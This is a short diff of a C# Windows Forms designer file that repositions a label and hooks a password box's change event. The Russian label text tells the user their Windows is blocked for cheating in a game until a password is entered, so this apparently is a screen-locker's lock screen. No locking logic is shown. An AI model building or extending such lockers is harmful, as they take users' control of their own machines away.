@@ -60,13 +60,11 @@
             // label2
             // 
             this.label2.AutoSize = true;
-            this.label2.Location = new System.Drawing.Point(168, 151);
+            this.label2.Location = new System.Drawing.Point(361, 150);
             this.label2.Name = "label2";
-            this.label2.Size = new System.Drawing.Size(997, 13);
+            this.label2.Size = new System.Drawing.Size(428, 13);
             this.label2.TabIndex = 2;
-            this.label2.Text = "Тари не нравится система обмана в игре, поэтому ваша windows заблокирована из-за " +
-    "обмана в игре, если вы ввели правильный пароль, ваша windows разблокирована, но " +
-    "обмана в игре нет :)";
+            this.label2.Text = "Тари:Ну что, читерок, доигрался? Надеюсь ты поймешь что с читами играть плохо";
             // 
             // label3
             // 
@@ -83,6 +81,7 @@
             this.password.Name = "password";
             this.password.Size = new System.Drawing.Size(160, 20);
             this.password.TabIndex = 4;
+            this.password.TextChanged += new System.EventHandler(this.password_TextChanged);
             // 
             // button1
             // 
